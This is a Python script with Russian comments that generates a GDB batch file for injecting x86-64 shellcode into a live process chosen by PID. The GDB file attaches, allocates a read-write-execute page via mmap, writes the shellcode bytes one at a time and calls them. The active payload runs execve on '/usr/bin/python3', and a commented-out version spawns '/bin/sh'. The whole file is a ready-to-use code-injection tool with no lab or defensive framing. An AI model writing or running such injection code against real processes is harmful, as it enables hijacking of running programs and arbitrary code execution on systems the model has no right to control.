import sys

# SHELLCODE = bytes([
#     0x48, 0x31, 0xc0,              # xor rax, rax
#     0x50,                          # push rax  (null terminator)
#     0x48, 0xb8,                    # mov rax, "//bin/sh"
#     0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
#     0x50,                          # push rax
#     0x48, 0x89, 0xe7,              # mov rdi, rsp
#     0x48, 0x31, 0xf6,              # xor rsi, rsi
#     0x48, 0x31, 0xd2,              # xor rdx, rdx
#     0x48, 0x31, 0xc0,              # xor rax, rax
#     0xb0, 0x3b,                    # mov al, 59  (execve)
#     0x0f, 0x05,                    # syscall
# ])

SHELLCODE = bytes([
    0x48, 0x31, 0xc0,              # xor rax, rax
    0x50,                          # push rax  (null terminator)

    0x48, 0xb8,                    # mov rax, 0x336e6f687479702f  # '/python3'
    0x2f, 0x70, 0x79, 0x74, 0x68, 0x6f, 0x6e, 0x33,
    0x50,                          # push rax

    0x48, 0xb8,                    # mov rax, 0x6e69622f7273752f  # '/usr/bin'
    0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e,
    0x50,                          # push rax

    0x48, 0x89, 0xe7,              # mov rdi, rsp               # rdi = "/usr/bin/python3\0"

    0x48, 0x31, 0xf6,              # xor rsi, rsi
    0x48, 0x31, 0xd2,              # xor rdx, rdx
    0x48, 0x31, 0xc0,              # xor rax, rax
    0xb0, 0x3b,                    # mov al, 59  (execve)
    0x0f, 0x05,                    # syscall
])

def gen_gdb_script(pid: int) -> str:
    lines = [
        "set debuginfod enabled off",
        f"attach {pid}",
        # Выделяем RWX страницу: mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC=7, MAP_PRIVATE|MAP_ANONYMOUS=0x22, -1, 0)
        "set $rwx = (void*)mmap(0, 4096, 7, 0x22, -1, 0)",
        'printf "mmap addr: %p\\n", $rwx',
    ]
    # Записываем shellcode байт за байтом
    for i, b in enumerate(SHELLCODE):
        lines.append(f"set {{char}}($rwx + {i}) = {b}")
    # Вызываем shellcode
    lines.append("call ((void(*)())$rwx)()")
    lines.append("detach")
    lines.append("quit")
    return "\n".join(lines)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <PID>")
        sys.exit(1)

    pid = int(sys.argv[1])
    script = gen_gdb_script(pid)

    out = "inject.gdb"
    with open(out, "w") as f:
        f.write(script)

    print(f"Generated {out} for PID {pid}")
    print(f"Run: gdb -q --batch -x {out}")
    print()
    print("--- inject.gdb ---")
    print(script[:500] + "...")
